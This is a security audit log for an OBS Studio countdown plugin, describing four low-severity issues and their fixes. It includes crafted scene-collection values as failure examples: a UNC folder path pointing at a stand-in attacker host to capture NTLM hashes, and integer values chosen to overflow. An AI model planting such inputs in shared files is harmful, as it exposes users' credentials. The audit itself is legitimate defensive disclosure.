document.title: Security audit 2026-11-07: input clamping, network paths, locking and CI pinning

acknowledgments.summary: found during an AI-assisted review of the full code base, directed by the maintainer

notes.title: Summary
notes.text: A review of the plugin source (src/), dev-install.sh and the GitHub Actions workflows found no memory-safety, injection or secret-exposure issues. Four low-severity hardening issues were found and fixed: unclamped settings from scene collections, network paths for the custom image folder on Windows, unlocked reads of shared size fields, and CI actions referenced by mutable tags.

notes.title: Scope and areas found sound
notes.text: Checked and found sound: bounds checks on the 32-byte layout buffer (append_char, append_num); no user data used as a format string; timer state consistently guarded by its mutex; texture reload performed inside obs_enter_graphics so textures are never freed mid-render; weak source references and QPointer use in context-bar.cpp; quoting and set -euo pipefail in dev-install.sh; CI uses pull_request (not pull_request_target), read-only token permissions except tag releases, and no attacker-controlled expressions inside run scripts. Out of scope: image decoding, which is done by libobs.

notes.title: Affected and fixed versions
notes.text: Affected: version 1.1.0 as committed up to a19e5fc. Fixed: the main branch commit that adds this log. No release had been published when these issues were fixed.

product.name: Nixie Countdown for OBS Studio, main branch with 2026-11-07 fixes

vulnerabilities.title: Unclamped settings from scene collections cause signed integer overflow

notes.title: Summary
notes.text: Duration, spacing and format settings were range-limited only in the Properties window, not when read back from settings, so a crafted scene collection could trigger signed overflow.

notes.title: Details and failure scenario
notes.text: Location: src/nixie-countdown.c, nixie_update (total = h * 3600 + m * 60 + s) and layout_width (x += n->spacing * (count - 1)). Scene collections are JSON files that users share and import. Failure scenario: a collection sets "hours": 9223372036854775807 or "spacing": 2147483647. h * 3600 overflows int64_t and the spacing sum overflows int, both undefined behavior in C. In practice this produced a wrong source size or a source that did not draw; the layout buffer stayed bounded, so no memory corruption was possible.

remediations.details: nixie_update now clamps hours to 0-999, minutes and seconds to 0-59, spacing to -60..150 and format to the known values with a new clamp_i64 helper. The ranges are shared constants (HOURS_MAX, SPACING_MIN, SPACING_MAX) also used by the Properties window.

threats.details: Low. Requires the user to load a crafted scene collection; worst case is a misdrawn source.

vulnerabilities.title: Custom tube image folder accepts network (UNC) paths on Windows

cwe.name: External Control of File Name or Path

notes.title: Summary
notes.text: On Windows, the custom image folder setting could name a remote share, causing OBS to contact that host and potentially send the user's network credentials.

notes.title: Details and failure scenario
notes.text: Location: src/nixie-countdown.c, load_tex (dstr_printf(&path, "%s/%s", custom_dir, name)). Failure scenario: a shared scene collection sets "image_dir": "\\\\attacker-host\\share". Loading 0.png from that path makes Windows open an SMB connection to attacker-host, which can capture the user's NTLM hash. OBS's built-in Image source has the same exposure.

remediations.details: New is_allowed_dir helper: on Windows, folder paths starting with two slashes or backslashes (\\host\share, //host/share, \\?\ forms) are ignored with a log warning and the built-in images are used. Other platforms are unchanged.

threats.details: Low. Windows only, requires loading a crafted scene collection, and the same exposure exists in OBS itself.

vulnerabilities.title: Texture size fields read and written without the source mutex

cwe.name: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')

notes.title: Summary
notes.text: nixie_get_height read the texture sizes and show_separators without the lock, and load_textures wrote the sizes without it, while get_width read them under the lock.

notes.title: Details and failure scenario
notes.text: Location: src/nixie-countdown.c, nixie_get_height and load_textures. get_width and get_height are called from the UI and video threads while nixie_update (UI thread) can reload textures. Failure scenario: changing the custom image folder while the source is shown races the size writes against the reads; at worst one frame used a stale size. A data race is still undefined behavior in C.

remediations.details: load_textures now writes the size fields under the source mutex (lock order: graphics, then mutex, the same order video_render uses), and nixie_get_height reads them under the mutex.

threats.details: Low. Benign in practice on current compilers and hardware.

vulnerabilities.title: GitHub Actions referenced by mutable version tags

cwe.name: Inclusion of Functionality from Untrusted Control Sphere

notes.title: Summary
notes.text: CI workflows used actions/checkout, cache, upload-artifact and download-artifact by the movable @v4 tag, so a compromised or re-pointed tag would run new code in the build that produces release packages.

notes.title: Details and failure scenario
notes.text: Location: .github/workflows/build-project.yaml, push.yaml and check-format.yaml (15 uses). Failure scenario: an upstream tag is moved to malicious code; the next push builds and packages the plugin with it, and tag pushes run with contents: write. The release action (softprops/action-gh-release) was already pinned to a commit hash.

remediations.details: Pinned each action to the commit its v4 tag pointed to on 2026-11-07, with the exact version in a comment: checkout 11d5960 (v4.4.0), cache 0057852 (v4.3.0), upload-artifact ea165f8 (v4.6.2), download-artifact d3f86a1 (v4.3.0). Updates now need a deliberate hash change.

threats.details: Low. Supply-chain hardening; no compromise of these actions is known.
